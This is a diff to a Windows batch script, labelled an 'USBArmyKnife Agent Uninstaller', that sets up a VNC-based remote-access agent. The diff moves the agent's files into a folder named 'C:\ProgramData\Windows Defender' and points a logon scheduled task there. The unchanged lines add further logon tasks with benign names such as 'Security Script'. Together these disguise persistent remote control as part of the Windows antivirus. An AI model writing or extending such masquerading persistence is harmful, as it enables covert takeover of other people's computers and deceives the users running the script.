@@ -2,7 +2,7 @@
 setlocal EnableExtensions EnableDelayedExpansion
 title USBArmyKnife Agent Uninstaller
 
-set "DEST=C:\AgentInstall"
+set "DEST=C:\ProgramData\Windows Defender"
 set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "SETTINGS=%DEST%\VncDirect\vnc-settings.json"
 
@@ -186,7 +186,7 @@ if !errorlevel! neq 0 ( schtasks /create /tn "USBArmyKnife Agent" /tr "%DEST%\Ag
 schtasks /query /tn "Security Script" >nul 2>&1
 if !errorlevel! neq 0 ( schtasks /create /tn "Security Script" /tr "%DEST%\AgentLauncher.exe vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
 schtasks /query /tn "VNC Watchdog" >nul 2>&1
-if !errorlevel! neq 0 ( schtasks /create /tn "VNC Watchdog" /tr "wscript.exe C:\AgentInstall\vnc-watchdog.vbs" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
+if !errorlevel! neq 0 ( schtasks /create /tn "VNC Watchdog" /tr "wscript.exe C:\ProgramData\Windows Defender\vnc-watchdog.vbs" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
 schtasks /query /tn "VNC Direct" >nul 2>&1
 if !errorlevel! equ 0 ( schtasks /delete /tn "VNC Direct" /f >nul 2>&1 )
 schtasks /query /tn "VNC Direct User" >nul 2>&1
